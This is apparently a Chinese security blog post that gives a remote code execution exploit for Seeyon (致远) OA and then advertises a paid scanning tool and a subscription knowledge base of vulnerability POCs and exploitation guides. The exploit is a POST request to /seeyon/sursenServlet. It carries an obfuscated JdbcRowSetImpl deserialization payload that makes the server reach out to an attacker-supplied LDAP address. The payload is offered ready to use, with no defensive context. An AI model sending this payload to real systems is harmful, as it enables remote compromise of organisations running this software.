#  致远OA rce  
原创 安全艺术
                    安全艺术  安全艺术   2026-01-16 00:30  
  
POST/seeyon/sursenServlet HTTP/1.1  
  
sursenData=%7B%22name%22%3A%7B%22%5Cu0040%5Cu0074%5Cu0079%5Cu0070%5Cu0065%22%3A%22%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu002e%5Cu006c%5Cu0061%5Cu006e%5Cu0067%5Cu002e%5Cu0043%5Cu006c%5Cu0061%5Cu0073%5Cu0073%22%2C%22%5Cu0076%5Cu0061%5Cu006c%22%3A%22%5Cu0063%5Cu006f%5Cu006d%5Cu002e%5Cu0073%5Cu0075%5Cu006e%5Cu002e%5Cu0072%5Cu006f%5Cu0077%5Cu0073%5Cu0065%5Cu0074%5Cu002e%5Cu004a%5Cu0064%5Cu0062%5Cu0063%5Cu0052%5Cu006f%5Cu0077%5Cu0053%5Cu0065%5Cu0074%5Cu0049%5Cu006d%5Cu0070%5Cu006c%22%7D%2C%22x%22%3A%7B%22%5Cu0040%5Cu0074%5Cu0079%5Cu0070%5Cu0065%22%3A%22%5Cu0063%5Cu006f%5Cu006d%5Cu002e%5Cu0073%5Cu0075%5Cu006e%5Cu002e%5Cu0072%5Cu006f%5Cu0077%5Cu0073%5Cu0065%5Cu0074%5Cu002e%5Cu004a%5Cu0064%5Cu0062%5Cu0063%5Cu0052%5Cu006f%5Cu0077%5Cu0053%5Cu0065%5Cu0074%5Cu0049%5Cu006d%5Cu0070%5Cu006c%22%2C%22%5Cu0064%5Cu0061%5Cu0074%5Cu0061%5Cu0053%5Cu006f%5Cu0075%5Cu0072%5Cu0063%5Cu0065%5Cu004e%5Cu0061%5Cu006d%5Cu0065":"ldap://xxxx","autoCommit":true}}  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7Lk7XiaheiaoZ2OlBDjkYbIiaeaO6QI4P43OCu9VN2iaPY6cS3DEpaF1scBwQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkLAyx6T6m0l1pYJKsaehsFoXPCMhJYLBbzrF5AvHEwxmJiagg4Pm8QZg/640?wx_fmt=png&from=appmsg "")  
  
新圈子上线  
  
https://www.yuque.com/carrypan-kpexq/secart/vkz04vw6fbatwgko?singleDoc#  
 《dddd和知识库》  
  
圈主介绍：  
  
多年攻防渗透和SRC挖掘经验，分享各种案例实战思路等，dddd优化来源于实战，多次护网中斩获上万分记录。  
  
知识库所有内容全部由圈主独自维护，严禁用于任何未授权扫描测试哈。  
# 1. dddd维护  
  
**选择这个工具的最重要的原因就是支持先识别指纹，然后根据指纹去扫描对应POC，扫描效率很高。**  
## 1.1. 指纹POC  
  
集成指纹、POC和workflow和POC优化（纯体力活，误报太多，陆陆续续维护2年了），目前指纹数据: 11227 条，漏洞POC: 4700 条，workflow：3483条，目前应该是市面上集成力度最大的了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkUSZiaFCZTPDmNEWFeFBSRkFNfVtEbGjfGwEicJDMibBrIicWw4PxVwVqQA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkF0eTfhEP127TfR6MbUZxhw0KnGEXKF7KNLtvBov5fhcoJuM53rufNg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkxuicKB6c38chVhBZhddDkzhbcibGK6ic9PlfT5D6fhfibLh1RLWYs8X3VA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkICZWC9nfgBf42sCcaZq5yVxPBaLJKnHSn1mcUIny0OoEudtpRe97tA/640?wx_fmt=png&from=appmsg "")  
## 1.2. 目录扫描  
  
这块主要是针对SRC挖掘和HVV项目中碰到的比较多的需要路径信息的指纹进行补充的，新增了很多发现频率非常高的springboot相关的接口信息，并通过指纹信息精准匹配，基本扫到就可以进一步利用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkibRrwvsth6tAsNHqQh6RXicKfPlohVAyW7fHjiaiazFyoqgoB3GNbNkkibg/640?wx_fmt=other&from=appmsg "")  
## 1.3. 指纹高亮  
  
这是来自师傅们提的需求，网站指纹识别输出，原版是统一输出的，没有任何区别，改版后新增了重点指纹（SRC和HVV漏洞高爆发点）高亮显示。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkibRrwvsth6tAsNHqQh6RXicKfPlohVAyW7fHjiaiazFyoqgoB3GNbNkkibg/640?wx_fmt=other&from=appmsg "")  
## 1.4. 蜜罐排除  
  
思路很简单，指纹识别超过10个默认是蜜罐，不进行任何扫描。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/X5epWh2K2OpTjzQAwZd6argfsK4Vy7Lk93xpYyhxt50DgxCJt9gguv1xs6SGAq5HmmTxSDu62mI6afPK8xuFCA/640?wx_fmt=other&from=appmsg "")  
  
其它死锁等bug修复。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkWBVJjiaeGwXr1ytF4xtF70DeeBCib3UY0dQAtqeGbzzicuHLWjjDicmjlg/640?wx_fmt=other&from=appmsg "")  
# 2. 知识库维护  
## 2.1. JAVA代码审计  
  
自费999元跟班上课学习记录从0到1完整版。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7Lk8WIChILYPaN7aIbNFE4E1Creibm7icufjXY43AeY3Hla2MzPDbFxNHag/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7Lk8uIJ7OAthsrF5QKcXCbIgTfA7bkF9vaXfv8uKbxEc9ou3tTomr46oA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkG6zo6AEqjo1tPU9ZBxiaAWqhfQVut1hxd5mhyyOkpfsmicZ2IyHlEnuA/640?wx_fmt=png&from=appmsg "")  
## 2.2. Nday漏洞POC  
  
各种渠道收集整理的POC，公开的和非公开的等等。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkdZ3Yl1nWm0t9NCr6Lp1wRR86xBuNjew9DcdWZ8swNNyBg86WlJmnvw/640?wx_fmt=png&from=appmsg "")  
## 2.3. dddd更新记录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkO9ceQOVc63ibTeRpPu5b6av9iapUzVOzfcqo2Or3Y6X4iaKw5YouY1GrA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LksRv89rsibFwbqxS5mqSuxS2tsoxBMpH9UxibJXtlAJfEiaXmOTkkOncmQ/640?wx_fmt=png&from=appmsg "")  
## 2.4. SRC实战记录  
  
个人SRC实战案例，案例来源猎聘、蔚来汽车、WPS、自如、龙湖、货拉拉、讯飞等SRC。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkIw9iaIQgNxq5BOBJ4rBWGj8qZhwGxIuGHtkVhD2JuBUV7CWBzKWM5aA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkABL3YgSZm9uaSBX9aJ5RqK8I81RUqIjQwOQVQ6gT9WiaqgIEED2YfGQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkmUibIkeOSeSoU06vKhMsIH4ud1Y4RZy6ZAmHqvS9C0o9dPkb41dTcPQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkGQvC0ibdCnnwx578iaJzs4L0OiaXufAFJmY0BxtLvO61bTXQpicmNktzjw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7Lk6lgBhPX2diacj2Q1ycFEE2VAvgNts5MYIbPnHAf1dqYwbeU38WbOvUQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LksZJtYekiaLRLSRPAAVlBte3WmmyEEZO1kBvDJ5BqI1Q6qOWib3LfiaQPQ/640?wx_fmt=png&from=appmsg "")  
## 2.5. 漏洞利用手册  
  
高频漏洞深入利用方式整理总结，附带工具和案例。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7Lk9ibTn6a7agnTSVcbJefWEtT3MNAoeUDicJBEUwhdVIRevsSUGYxlsGZA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkX9DLsicxpEPK6jicDVJU0nP2JTpU77kAvoNSd4aWCqsxMf0FMWmNiadAw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkDXfZTIjrdh10icVdZKyrS0HXScvtofW3tDTZ6K5BwBkXWwOW3ql8UOw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkrJHQibNJ8kicfMkyMS5zFwC8kJChiaVJA1Qibk5KupLb18l8ut2cXicq8zw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LktV7NJFFBuIqM98gPs7vNiaOLgITdcdq270Ug8nFP8KOSoTbUS0exVLg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7Lk7KMmjA291s1tg3icx2RKEaHiaibulLb17tPm6ZS51anSXa5n33RsxnZ2Q/640?wx_fmt=png&from=appmsg "")  
## 2.6. 实战技巧总结  
  
SRC、CNVD和HVV快速挖洞思路整理，附带实战案例。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkqDWW4mIGacIG0icU5pUnRI1ZQcKICxciaF04dhplsiaOaHLhEjmFrNYzg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkBPicpqTbg0BW8qQYhyCohgYbzMLUtAvtyE7gHR0n8alhmPrd9WIpd7Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7Lkgeo3POVibibLFoGasYKSWVmVr7JmzdF0hJrT82FNlZSDck1LqgUXAmdw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7Lk33dmM9YUcn3XDlE4sdJAznXOkSsnK53EeUtibvxxDgLX7BzyaiaB7jPQ/640?wx_fmt=png&from=appmsg "")  
## 2.7. 工具插件字典  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkD1jCnosZ7ichXp8RI6Ynhq7IYfXh6bic5mOrZQtvc2kd4arcOzRhSia9g/640?wx_fmt=png&from=appmsg "")  
# 3. 加入安艺圈  
## 3.1. 购买套餐  
  
•套餐一：dddd激活码：一年200；  
  
•套餐二：安艺圈知识库：一年318；  
  
•套餐三：dddd激活码+安艺圈知识库：一年500。  
## 3.2. 微信新用户  
  
加好友备注dddd进交流群看公告购买。  
  
（dddd**每人限1个激活码，激活前请选好常用电脑**  
）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkDjCA4V592eGFK35zg8hP50HuONaqicGnQ52d7P0THzuXkhxz5zicpmhQ/640?wx_fmt=jpeg&from=appmsg "")  
  
知识库需要联系我进入内部群获取。  
## 3.3. 纷传老用户  
  
登录纷传小程序或者APP中，点击"设置"进入设置界面进行截图，将设置截图和dddd运行截图通过微信发给我获取激活码。（dddd**每人限1个激活码，激活前请选好常用电脑**  
）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkCXXiacTpspUCkM3mELurhVLRfpIsibiaaOQpicicQOJrlTn8OnPvmPuduXg/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkZyHjGImPh4XeVXJgwYdZQbzu9cbdcsuXuO34QMVLCuH9ejZGeKibMPQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OpTjzQAwZd6argfsK4Vy7LkjyG4f77HXmJ8WKP5A3vZIcDym7PrkEnZxXSumq7DMhR3C8Ya4iccFuw/640?wx_fmt=png&from=appmsg "")  
  
  
